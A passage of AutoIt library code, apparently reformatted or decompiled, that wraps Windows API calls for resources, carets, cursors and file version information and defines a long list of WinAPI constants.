        Local $acall = DllCall("kernel32.dll", "handle", "FindResourceExW", "handle", $hinstance, $stypeoftype, $stype, $stypeofname, $sname, "ushort", $ilanguage)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindResourceEx

    Func _WinAPI_FreeResource($hdata)
        Local $acall = DllCall("kernel32.dll", "bool", "FreeResource", "handle", $hdata)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FreeResource

    Func _WinAPI_GetCaretBlinkTime()
        Local $acall = DllCall("user32.dll", "uint", "GetCaretBlinkTime")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCaretBlinkTime

    Func _WinAPI_GetCaretPos()
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("user32.dll", "bool", "GetCaretPos", "struct*", $tpoint)
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Local $aret[0x2]
        For $i = 0x0 To 0x1
            $aret[$i] = DllStructGetData($tpoint, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetCaretPos

    Func _WinAPI_GetClipCursor()
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "GetClipCursor", "struct*", $trect)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetClipCursor

    Func _WinAPI_GetCursor()
        Local $acall = DllCall("user32.dll", "handle", "GetCursor")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCursor

    Func _WinAPI_GetFileVersionInfo($sfilepath, ByRef $pbuffer, $iflags = 0x0)
        Local $acall
        If _WinAPI_GetVersion() >= 6 Then
            $acall = DllCall("version.dll", "dword", "GetFileVersionInfoSizeExW", "dword", BitAND($iflags, 0x3), "wstr", $sfilepath, "ptr", 0x0)
        Else
            $acall = DllCall("version.dll", "dword", "GetFileVersionInfoSizeW", "wstr", $sfilepath, "ptr", 0x0)
        EndIf
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        $pbuffer = __HeapReAlloc($pbuffer, $acall[0x0], 0x1)
        If @error Then Return SetError(@error + 0x64, @extended, 0x0)
        Local $inbbyte = $acall[0x0]
        If _WinAPI_GetVersion() >= 6 Then
            $acall = DllCall("version.dll", "bool", "GetFileVersionInfoExW", "dword", BitAND($iflags, 0x7), "wstr", $sfilepath, "dword", 0x0, "dword", $inbbyte, "ptr", $pbuffer)
        Else
            $acall = DllCall("version.dll", "bool", "GetFileVersionInfoW", "wstr", $sfilepath, "dword", 0x0, "dword", $inbbyte, "ptr", $pbuffer)
        EndIf
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $inbbyte
    EndFunc    ; -> _WinAPI_GetFileVersionInfo

    Func _WinAPI_HideCaret($hwnd)
        Local $acall = DllCall("user32.dll", "int", "HideCaret", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_HideCaret

    Func _WinAPI_LoadBitmap($hinstance, $sbitmap)
        Local $sbitmaptype = "int"
        If IsString($sbitmap) Then $sbitmaptype = "wstr"
        Local $acall = DllCall("user32.dll", "handle", "LoadBitmapW", "handle", $hinstance, $sbitmaptype, $sbitmap)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadBitmap

    Func _WinAPI_LoadCursor($hinstance, $sname)
        Local $stypeofname = "int"
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("user32.dll", "handle", "LoadCursorW", "handle", $hinstance, $stypeofname, $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadCursor

    Func _WinAPI_LoadCursorFromFile($sfilepath)
        Local $acall = DllCall("user32.dll", "handle", "LoadCursorFromFileW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadCursorFromFile

    Func _WinAPI_LoadIndirectString($sstrin)
        Local $acall = DllCall("shlwapi.dll", "uint", "SHLoadIndirectString", "wstr", $sstrin, "wstr", '', "uint", 0x1000, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_LoadIndirectString

    Func _WinAPI_LoadString($hinstance, $istringid)
        Local $acall = DllCall("user32.dll", "int", "LoadStringW", "handle", $hinstance, "uint", $istringid, "wstr", '', "int", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x3])
    EndFunc    ; -> _WinAPI_LoadString

    Func _WinAPI_LoadLibraryEx($sfilename, $iflags = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "LoadLibraryExW", "wstr", $sfilename, "ptr", 0x0, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadLibraryEx

    Func _WinAPI_LoadResource($hinstance, $hresource)
        Local $acall = DllCall("kernel32.dll", "handle", "LoadResource", "handle", $hinstance, "handle", $hresource)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadResource

    Func _WinAPI_LoadStringEx($hmodule, $iid, $ilanguage = $LOCALE_USER_DEFAULT)
        Local $ilibrary = 0x0
        If IsString($hmodule) Then
            If StringStripWS($hmodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $hmodule = _WinAPI_LoadLibraryEx($hmodule, BitOR($DONT_RESOLVE_DLL_REFERENCES, $LOAD_LIBRARY_AS_DATAFILE))
                If Not $hmodule Then Return SetError(@error + 0x14, @extended, '')
                $ilibrary = 0x1
            Else
                $hmodule = 0x0
            EndIf
        EndIf
        Local $sresult = ''
        Local $pdata = __ResLoad($hmodule, 0x6, Floor($iid / 0x10) + 0x1, $ilanguage)
        If Not @error Then
            Local $ioffset = 0x0
            For $i = 0x0 To Mod($iid, 0x10) + -1
                $ioffset += 0x2 * (DllStructGetData(DllStructCreate("ushort", $pdata + $ioffset), 0x1) + 0x1)
            Next
            $sresult = DllStructGetData(DllStructCreate("ushort;wchar[" & DllStructGetData(DllStructCreate("ushort", $pdata + $ioffset), 0x1) & "]", $pdata + $ioffset), 0x2)
            If @error Then $sresult = ''
        Else
            Return SetError(0xa, 0x0, '')
        EndIf
        If $ilibrary Then
            _WinAPI_FreeLibrary($hmodule)
        EndIf
        Return SetError(Number(Not $sresult), 0x0, $sresult)
    EndFunc    ; -> _WinAPI_LoadStringEx

    Func _WinAPI_LockResource($hdata)
        Local $acall = DllCall("kernel32.dll", "ptr", "LockResource", "handle", $hdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LockResource

    Func _WinAPI_SetCaretBlinkTime($iduration)
        Local $iprev = _WinAPI_GetCaretBlinkTime()
        If Not $iprev Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("user32.dll", "bool", "SetCaretBlinkTime", "uint", $iduration)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $iprev
    EndFunc    ; -> _WinAPI_SetCaretBlinkTime

    Func _WinAPI_SetCaretPos($ix, $iy)
        Local $acall = DllCall("user32.dll", "int", "SetCaretPos", "int", $ix, "int", $iy)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetCaretPos

    Func _WinAPI_SetCursor($hcursor)
        Local $acall = DllCall("user32.dll", "handle", "SetCursor", "handle", $hcursor)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetCursor

    Func _WinAPI_SetSystemCursor($hcursor, $iid, $bcopy = False)
        If $bcopy Then
            $hcursor = _WinAPI_CopyCursor($hcursor)
        EndIf
        Local $acall = DllCall("user32.dll", "bool", "SetSystemCursor", "handle", $hcursor, "dword", $iid)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetSystemCursor

    Func _WinAPI_ShowCaret($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "ShowCaret", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShowCaret

    Func _WinAPI_ShowCursor($bshow)
        Local $acall = DllCall("user32.dll", "int", "ShowCursor", "bool", $bshow)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShowCursor

    Func _WinAPI_SizeOfResource($hinstance, $hresource)
        Local $acall = DllCall("kernel32.dll", "dword", "SizeofResource", "handle", $hinstance, "handle", $hresource)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SizeOfResource

    Func _WinAPI_UpdateResource($hupdate, $stype, $sname, $ilanguage, $pdata, $isize)
        Local $stypeoftype = "int", $stypeofname = "int"
        If IsString($stype) Then
            $stypeoftype = "wstr"
        EndIf
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("kernel32.dll", "bool", "UpdateResourceW", "handle", $hupdate, $stypeoftype, $stype, $stypeofname, $sname, "word", $ilanguage, "ptr", $pdata, "dword", $isize)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UpdateResource

    Func _WinAPI_VerQueryRoot($pdata)
        Local $acall = DllCall("version.dll", "bool", "VerQueryValueW", "ptr", $pdata, "wstr", "\\", "ptr*", 0x0, "uint*", 0x0)
        If @error Or Not $acall[0x0] Or Not $acall[0x4] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tvffi = DllStructCreate($TAGVS_FIXEDFILEINFO)
        If Not _WinAPI_MoveMemory($tvffi, $acall[0x3], $acall[0x4]) Then Return SetError(@error + 0x14, @extended, 0x0)
        Return $tvffi
    EndFunc    ; -> _WinAPI_VerQueryRoot

    Func _WinAPI_VerQueryValue($pdata, $svalues = '')
        $svalues = StringRegExpReplace($svalues, "\\A[\\s\\|]*|[\\s\\|]*\\Z", '')
        If Not $svalues Then
            $svalues = "Comments|CompanyName|FileDescription|FileVersion|InternalName|LegalCopyright|LegalTrademarks|OriginalFilename|ProductName|ProductVersion|PrivateBuild|SpecialBui" & _
                "ld"
        EndIf
        $svalues = StringSplit($svalues, "|", $STR_NOCOUNT)
        Local $acall = DllCall("version.dll", "bool", "VerQueryValueW", "ptr", $pdata, "wstr", "\\VarFileInfo\\Translation", "ptr*", 0x0, "uint*", 0x0)
        If @error Or Not $acall[0x0] Or Not $acall[0x4] Then Return SetError(@error + 0xa, 0x0, 0x0)
        Local $ilength = Floor($acall[0x4] / 0x4)
        Local $tlang = DllStructCreate("dword[" & $ilength & "]", $acall[0x3])
        If @error Then Return SetError(@error + 0x14, 0x0, 0x0)
        Local $scp, $ainfo[0x65][UBound($svalues) + 0x1] = [[0x0]]
        For $i = 0x1 To $ilength
            __Inc($ainfo)
            $ainfo[$ainfo[0x0][0x0]][0x0] = _WinAPI_LoWord(DllStructGetData($tlang, 0x1, $i))
            $scp = Hex(_WinAPI_MakeLong(_WinAPI_HiWord(DllStructGetData($tlang, 0x1, $i)), _WinAPI_LoWord(DllStructGetData($tlang, 0x1, $i))), 0x8)
            For $j = 0x0 To UBound($svalues) + -1
                $acall = DllCall("version.dll", "bool", "VerQueryValueW", "ptr", $pdata, "wstr", "\\StringFileInfo\\" & $scp & "\\" & $svalues[$j], "ptr*", 0x0, "uint*", 0x0)
                If Not @error And $acall[0x0] And $acall[0x4] Then
                    $ainfo[$ainfo[0x0][0x0]][$j + 0x1] = DllStructGetData(DllStructCreate("wchar[" & $acall[0x4] & "]", $acall[0x3]), 0x1)
                Else
                    $ainfo[$ainfo[0x0][0x0]][$j + 0x1] = ''
                EndIf
            Next
        Next
        __Inc($ainfo, + -1)
        Return $ainfo
    EndFunc    ; -> _WinAPI_VerQueryValue

    Func _WinAPI_VerQueryValueEx($hmodule, $svalues = '', $ilanguage = 0x400)
        $__g_vval = StringRegExpReplace($svalues, "\\A[\\s\\|]*|[\\s\\|]*\\Z", '')
        If Not $__g_vval Then
            $__g_vval = "Comments|CompanyName|FileDescription|FileVersion|InternalName|LegalCopyright|LegalTrademarks|OriginalFilename|ProductName|ProductVersion|PrivateBuild|SpecialBui" & _
                "ld"
        EndIf
        $__g_vval = StringSplit($__g_vval, "|")
        If Not IsArray($__g_vval) Then Return SetError(0x1, 0x0, 0x0)
        Local $ilibrary = 0x0
        If IsString($hmodule) Then
            If StringStripWS($hmodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $hmodule = _WinAPI_LoadLibraryEx($hmodule, BitOR($DONT_RESOLVE_DLL_REFERENCES, $LOAD_LIBRARY_AS_DATAFILE))
                If Not $hmodule Then
                    Return SetError(@error + 0xa, @extended, 0x0)
                EndIf
                $ilibrary = 0x1
            Else
                $hmodule = 0x0
            EndIf
        EndIf
        Dim $__g_venum[0x65][$__g_vval[0x0] + 0x1] = [[0x0]]
        Local $henumproc = DllCallbackRegister("__EnumVerValuesProc", "bool", "ptr;ptr;ptr;word;long_ptr")
        Local $acall = DllCall("kernel32.dll", "bool", "EnumResourceLanguagesW", "handle", $hmodule, "int", 0x10, "int", 0x1, "ptr", DllCallbackGetPtr($henumproc), "long_ptr", $ilanguage)
        Do
            If @error Then
                $__g_venum = @error + 0x14
            Else
                If Not $acall[0x0] Then
                    Switch _WinAPI_GetLastError()
                    Case 0x0, 0x3b02
                        ExitLoop
                    Case Else
                        $__g_venum = 0x14
                    EndSwitch
                Else
                    ExitLoop
                EndIf
            EndIf
        Until 0x1
        If $ilibrary Then
            _WinAPI_FreeLibrary($hmodule)
        EndIf
        DllCallbackFree($henumproc)
        If Not $__g_venum[0x0][0x0] Then $__g_venum = 0xe6
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_VerQueryValueEx

#EndRegion Public Functions
#Region Internal Functions
    Func __EnumResLanguagesProc($hmodule, $itype, $INAME, $ilanguage, $lparam)
        #forceref $hModule, $iType, $iName, $lParam
        __Inc($__g_venum)
        $__g_venum[$__g_venum[0x0]] = $ilanguage
        Return 0x1
    EndFunc    ; -> __EnumResLanguagesProc

    Func __EnumResNamesProc($hmodule, $itype, $INAME, $lparam)
        #forceref $hModule, $iType, $lParam
        Local $ilength = _WinAPI_StrLen($INAME)
        __Inc($__g_venum)
        If $ilength Then
            $__g_venum[$__g_venum[0x0]] = DllStructGetData(DllStructCreate("wchar[" & ($ilength + 0x1) & "]", $INAME), 0x1)
        Else
            $__g_venum[$__g_venum[0x0]] = Number($INAME)
        EndIf
        Return 0x1
    EndFunc    ; -> __EnumResNamesProc

    Func __EnumResTypesProc($hmodule, $itype, $lparam)
        #forceref $hModule, $lParam
        Local $ilength = _WinAPI_StrLen($itype)
        __Inc($__g_venum)
        If $ilength Then
            $__g_venum[$__g_venum[0x0]] = DllStructGetData(DllStructCreate("wchar[" & ($ilength + 0x1) & "]", $itype), 0x1)
        Else
            $__g_venum[$__g_venum[0x0]] = Number($itype)
        EndIf
        Return 0x1
    EndFunc    ; -> __EnumResTypesProc

    Func __EnumVerValuesProc($hmodule, $itype, $INAME, $ilanguage, $idefault)
        Local $acall, $ienum = 0x1, $ierror = 0x0
        Switch $idefault
        Case + -1
        Case 0x400
            $ilanguage = 0x400
            $ienum = 0x0
        Case Else
            If $ilanguage <> $idefault Then
                Return 0x1
            EndIf
            $ienum = 0x0
        EndSwitch
        Do
            Local $pdata = __ResLoad($hmodule, $itype, $INAME, $ilanguage)
            If @error Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            $acall = DllCall("version.dll", "bool", "VerQueryValueW", "ptr", $pdata, "wstr", "\\VarFileInfo\\Translation", "ptr*", 0x0, "uint*", 0x0)
            If @error Or Not $acall[0x0] Or Not $acall[0x4] Then
                $ierror = @error + 0x14
                ExitLoop
            EndIf
            Local $tdata = DllStructCreate("ushort;ushort", $acall[0x3])
            If @error Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
        Until 0x1
        If Not $ierror Then
            __Inc($__g_venum)
            $__g_venum[$__g_venum[0x0][0x0]][0x0] = DllStructGetData($tdata, 0x1)
            Local $scp = Hex(_WinAPI_MakeLong(DllStructGetData($tdata, 0x2), DllStructGetData($tdata, 0x1)), 0x8)
            For $i = 0x1 To $__g_vval[0x0]
                $acall = DllCall("version.dll", "bool", "VerQueryValueW", "ptr", $pdata, "wstr", "\\StringFileInfo\\" & $scp & "\\" & $__g_vval[$i], "ptr*", 0x0, "uint*", 0x0)
                If Not @error And $acall[0x0] And $acall[0x4] Then
                    $__g_venum[$__g_venum[0x0][0x0]][$i] = DllStructGetData(DllStructCreate("wchar[" & $acall[0x4] & "]", $acall[0x3]), 0x1)
                Else
                    $__g_venum[$__g_venum[0x0][0x0]][$i] = ''
                EndIf
            Next
        Else
            $__g_venum = @error + 0x28
        EndIf
        If $__g_venum Then Return SetError($ierror, 0x0, 0x0)
        Return $ienum
    EndFunc    ; -> __EnumVerValuesProc

    Func __ResLoad($hinstance, $stype, $sname, $ilanguage)
        Local $hinfo = _WinAPI_FindResourceEx($hinstance, $stype, $sname, $ilanguage)
        If Not $hinfo Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $isize = _WinAPI_SizeOfResource($hinstance, $hinfo)
        If Not $isize Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $hdata = _WinAPI_LoadResource($hinstance, $hinfo)
        If Not $hdata Then Return SetError(@error + 0x1e, @extended, 0x0)
        Local $pdata = _WinAPI_LockResource($hdata)
        If Not $pdata Then Return SetError(@error + 0x28, @extended, 0x0)
        Return SetExtended($isize, $pdata)
    EndFunc    ; -> __ResLoad

#EndRegion Internal Functions
Global Const $KLF_ACTIVATE = 0x1
Global Const $KLF_NOTELLSHELL = 0x80
Global Const $KLF_REORDER = 0x8
Global Const $KLF_REPLACELANG = 0x10
Global Const $KLF_RESET = 0x40000000
Global Const $KLF_SETFORPROCESS = 0x100
Global Const $KLF_SHIFTLOCK = 0x10000
Global Const $KLF_SUBSTITUTE_OK = 0x2
Global Const $HKL_NEXT = 0x1
Global Const $HKL_PREV = 0x0
Global Const $AW_ACTIVATE = 0x20000
Global Const $AW_BLEND = 0x80000
Global Const $AW_CENTER = 0x10
Global Const $AW_HIDE = 0x10000
Global Const $AW_HOR_NEGATIVE = 0x2
Global Const $AW_HOR_POSITIVE = 0x1
Global Const $AW_SLIDE = 0x40000
Global Const $AW_VER_NEGATIVE = 0x8
Global Const $AW_VER_POSITIVE = 0x4
Global Const $BSF_ALLOWSFW = 0x80
Global Const $BSF_FLUSHDISK = 0x4
Global Const $BSF_FORCEIFHUNG = 0x20
Global Const $BSF_IGNORECURRENTTASK = 0x2
Global Const $BSF_NOHANG = 0x8
Global Const $BSF_NOTIMEOUTIFNOTHUNG = 0x40
Global Const $BSF_POSTMESSAGE = 0x10
Global Const $BSF_QUERY = 0x1
Global Const $BSF_SENDNOTIFYMESSAGE = 0x100
Global Const $BSM_ALLCOMPONENTS = 0x0
Global Const $BSM_ALLDESKTOPS = 0x8
Global Const $BSM_APPLICATIONS = 0x10
Global Const $BSM_INSTALLABLEDRIVERS = 0x4
Global Const $BSM_NETDRIVER = 0x2
Global Const $BSM_VXDS = 0x1
Global Const $MDITILE_HORIZONTAL = 0x1
Global Const $MDITILE_SKIPDISABLED = 0x2
Global Const $MDITILE_VERTICAL = 0x0
Global Const $MDITILE_ZORDER = 0x4
Global Const $MSGFLT_ALLOW = 0x1
Global Const $MSGFLT_DISALLOW = 0x2
Global Const $MSGFLT_RESET = 0x0
Global Const $MSGFLTINFO_ALLOWED_HIGHER = 0x3
Global Const $MSGFLTINFO_ALREADYALLOWED_FORWND = 0x1
Global Const $MSGFLTINFO_ALREADYDISALLOWED_FORWND = 0x2
Global Const $MSGFLTINFO_NONE = 0x0
Global Const $CWP_ALL = 0x0
Global Const $CWP_SKIPINVISIBLE = 0x1
Global Const $CWP_SKIPDISABLED = 0x2
Global Const $CWP_SKIPTRANSPARENT = 0x4
Global Const $COMPRESSION_FORMAT_NONE = 0x0
Global Const $COMPRESSION_FORMAT_DEFAULT = 0x1
Global Const $COMPRESSION_FORMAT_LZNT1 = 0x2
Global Const $COMPRESSION_FORMAT_XPRESS = 0x3
Global Const $COMPRESSION_FORMAT_XPRESS_HUFF = 0x4
Global Const $COMPRESSION_ENGINE_STANDARD = 0x0
Global Const $COMPRESSION_ENGINE_MAXIMUM = 0x100
Global Const $COMPRESSION_ENGINE_HIBER = 0x200
Global Const $WINSTA_ACCESSCLIPBOARD = 0x4
Global Const $WINSTA_ACCESSGLOBALATOMS = 0x20
Global Const $WINSTA_CREATEDESKTOP = 0x8
Global Const $WINSTA_ENUMDESKTOPS = 0x1
Global Const $WINSTA_ENUMERATE = 0x100
Global Const $WINSTA_EXITWINDOWS = 0x40
Global Const $WINSTA_READATTRIBUTES = 0x2
Global Const $WINSTA_READSCREEN = 0x200
Global Const $WINSTA_WRITEATTRIBUTES = 0x10
Global Const $WINSTA_ALL_ACCESS = BitOR($WINSTA_ACCESSCLIPBOARD, $WINSTA_ACCESSGLOBALATOMS, $WINSTA_CREATEDESKTOP, $WINSTA_ENUMDESKTOPS, $WINSTA_ENUMERATE, $WINSTA_EXITWINDOWS, $WINSTA_READATTRIBUTES, $WINSTA_READSCREEN, $WINSTA_WRITEATTRIBUTES)
Global Const $CWF_CREATE_ONLY = 0x1
Global Const $GCL_CBCLSEXTRA = + -20
Global Const $GCL_CBWNDEXTRA = + -18
Global Const $GCL_HBRBACKGROUND = + -10
Global Const $GCL_HCURSOR = + -12
Global Const $GCL_HICON = + -14
Global Const $GCL_HICONSM = + -34
Global Const $GCL_HMODULE = + -16
Global Const $GCL_MENUNAME = + -8
Global Const $GCL_STYLE = + -26
Global Const $GCL_WNDPROC = + -24
Global Const $DOCKINFO_DOCKED = 0x2
Global Const $DOCKINFO_UNDOCKED = 0x1
Global Const $DOCKINFO_USER_SUPPLIED = 0x4
Global Const $DOCKINFO_USER_DOCKED = 0x5
Global Const $DOCKINFO_USER_UNDOCKED = 0x6
Global Const $GUI_CARETBLINKING = 0x1
Global Const $GUI_INMENUMODE = 0x4
Global Const $GUI_INMOVESIZE = 0x2
Global Const $GUI_POPUPMENUMODE = 0x10
Global Const $GUI_SYSTEMMENUMODE = 0x8
Global Const $HANDLE_FLAG_INHERIT = 0x1
Global Const $HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x2
Global Const $GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS = 0x4
Global Const $GET_MODULE_HANDLE_EX_FLAG_PIN = 0x1
Global Const $GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT = 0x2
Global Const $GET_MODULE_HANDLE_EX_FLAG_DEFAULT = 0x0
Global Const $PROCESSOR_ARCHITECTURE_AMD64 = 0x9
Global Const $PROCESSOR_ARCHITECTURE_IA64 = 0x6
Global Const $PROCESSOR_ARCHITECTURE_INTEL = 0x0
Global Const $PROCESSOR_ARCHITECTURE_UNKNOWN = 0xffff
Global Const $PROCESSOR_INTEL_386 = 0x182
Global Const $PROCESSOR_INTEL_486 = 0x1e6
Global Const $PROCESSOR_INTEL_PENTIUM = 0x24a
Global Const $PROCESSOR_INTEL_IA64 = 0x898
Global Const $PROCESSOR_AMD_X8664 = 0x21d8
Global Const $UOI_FLAGS = 0x1
Global Const $UOI_HEAPSIZE = 0x5
Global Const $UOI_IO = 0x6
Global Const $UOI_NAME = 0x2
Global Const $UOI_TYPE = 0x3
Global Const $UOI_USER_SID = 0x4
Global Const $DF_ALLOWOTHERACCOUNTHOOK = 0x1
Global Const $WSF_VISIBLE = 0x1
Global Const $VER_SUITE_BACKOFFICE = 0x4
Global Const $VER_SUITE_BLADE = 0x400
Global Const $VER_SUITE_COMPUTE_SERVER = 0x4000
Global Const $VER_SUITE_DATACENTER = 0x80
Global Const $VER_SUITE_ENTERPRISE = 0x2
Global Const $VER_SUITE_EMBEDDEDNT = 0x40
Global Const $VER_SUITE_PERSONAL = 0x200
Global Const $VER_SUITE_SINGLEUSERTS = 0x100
Global Const $VER_SUITE_SMALLBUSINESS = 0x1
Global Const $VER_SUITE_SMALLBUSINESS_RESTRICTED = 0x20
Global Const $VER_SUITE_STORAGE_SERVER = 0x2000
Global Const $VER_SUITE_TERMINAL = 0x10
Global Const $VER_SUITE_WH_SERVER = 0x8000
Global Const $VER_NT_DOMAIN_CONTROLLER = 0x2
Global Const $VER_NT_SERVER = 0x3
Global Const $VER_NT_WORKSTATION = 0x1
Global Const $WDA_MONITOR = 0x1
Global Const $WDA_NONE = 0x0
Global Const $PF_3DNOW_INSTRUCTIONS_AVAILABLE = 0x7
Global Const $PF_CHANNELS_ENABLED = 0x10
Global Const $PF_COMPARE_EXCHANGE_DOUBLE = 0x2
Global Const $PF_COMPARE_EXCHANGE128 = 0xe
Global Const $PF_COMPARE64_EXCHANGE128 = 0xf
Global Const $PF_FLOATING_POINT_EMULATED = 0x1
Global Const $PF_FLOATING_POINT_PRECISION_ERRATA = 0x0
Global Const $PF_MMX_INSTRUCTIONS_AVAILABLE = 0x3
Global Const $PF_NX_ENABLED = 0xc
Global Const $PF_PAE_ENABLED = 0x9
Global Const $PF_RDTSC_INSTRUCTION_AVAILABLE = 0x8
Global Const $PF_SSE3_INSTRUCTIONS_AVAILABLE = 0xd
Global Const $PF_XMMI_INSTRUCTIONS_AVAILABLE = 0x6
Global Const $PF_XMMI64_INSTRUCTIONS_AVAILABLE = 0xa
Global Const $PF_XSAVE_ENABLED = 0x11
Global Const $KEYEVENTF_EXTENDEDKEY = 0x1
Global Const $KEYEVENTF_KEYUP = 0x2
Global Const $LIM_SMALL = 0x0
Global Const $LIM_LARGE = 0x1
Global Const $MAPVK_VK_TO_CHAR = 0x2
Global Const $MAPVK_VK_TO_VSC = 0x0
Global Const $MAPVK_VK_TO_VSC_EX = 0x4
Global Const $MAPVK_VSC_TO_VK = 0x1
Global Const $MAPVK_VSC_TO_VK_EX = 0x3
Global Const $MOD_ALT = 0x1
Global Const $MOD_CONTROL = 0x2
Global Const $MOD_NOREPEAT = 0x4000
Global Const $MOD_SHIFT = 0x4
Global Const $MOD_WIN = 0x8
Global Const $GUID_ACDC_POWER_SOURCE = "{5D3E9A59-E9D5-4B00-A6BD-FF34FF516548}"
Global Const $GUID_BATTERY_PERCENTAGE_REMAINING = "{A7AD8041-B45A-4CAE-87A3-EECBB468A9E1}"
Global Const $GUID_IDLE_BACKGROUND_TASK = "{515C31D8-F734-163D-A0FD-11A08C91E8F1}"
Global Const $GUID_MONITOR_POWER_ON = "{02731015-4510-4526-99E6-E5A17EBD1AEA}"
Global Const $GUID_POWERSCHEME_PERSONALITY = "{245D8541-3943-4422-B025-13A784F679B7}"
Global Const $GUID_SYSTEM_AWAYMODE = "{98A7F580-01F7-48AA-9C0F-44352C29E5C0}"
Global Const $GUID_MIN_POWER_SAVINGS = "{8C5E7FDA-E8BF-4A96-9A85-A6E23A8C635C}"
Global Const $GUID_MAX_POWER_SAVINGS = "{A1841308-3541-4FAB-BC81-F71556F20B4A}"
Global Const $GUID_TYPICAL_POWER_SAVINGS = "{381B4222-F694-41F0-9685-FF5BB260DF2E}"
Global Const $HSHELL_WINDOWCREATED = 0x1
Global Const $HSHELL_WINDOWDESTROYED = 0x2
Global Const $HSHELL_ACTIVATESHELLWINDOW = 0x3
Global Const $HSHELL_WINDOWACTIVATED = 0x4
Global Const $HSHELL_GETMINRECT = 0x5
Global Const $HSHELL_REDRAW = 0x6
Global Const $HSHELL_TASKMAN = 0x7
Global Const $HSHELL_LANGUAGE = 0x8
Global Const $HSHELL_SYSMENU = 0x9
Global Const $HSHELL_ENDTASK = 0xa
Global Const $HSHELL_ACCESSIBILITYSTATE = 0xb
Global Const $HSHELL_APPCOMMAND = 0xc
Global Const $HSHELL_WINDOWREPLACED = 0xd
Global Const $HSHELL_WINDOWREPLACING = 0xe
Global Const $HSHELL_RUDEAPPACTIVATED = 0x8004
Global Const $HSHELL_FLASH = 0x8006
Global Const $HWND_BROADCAST = 0xffff
Global Const $SMTO_BLOCK = 0x1
Global Const $SMTO_NORMAL = 0x0
Global Const $SMTO_ABORTIFHUNG = 0x2
Global Const $SMTO_NOTIMEOUTIFNOTHUNG = 0x8
Global Const $SMTO_ERRORONEXIT = 0x20
Global Const $INPUTLANGCHANGE_BACKWARD = 0x4
Global Const $INPUTLANGCHANGE_FORWARD = 0x2
Global Const $INPUTLANGCHANGE_SYSCHARSET = 0x1
Global Const $EVENT_MIN = 0x1
Global Const $EVENT_SYSTEM_SOUND = 0x1
Global Const $EVENT_SYSTEM_ALERT = 0x2
Global Const $EVENT_SYSTEM_FOREGROUND = 0x3
Global Const $EVENT_SYSTEM_MENUSTART = 0x4
Global Const $EVENT_SYSTEM_MENUEND = 0x5
Global Const $EVENT_SYSTEM_MENUPOPUPSTART = 0x6
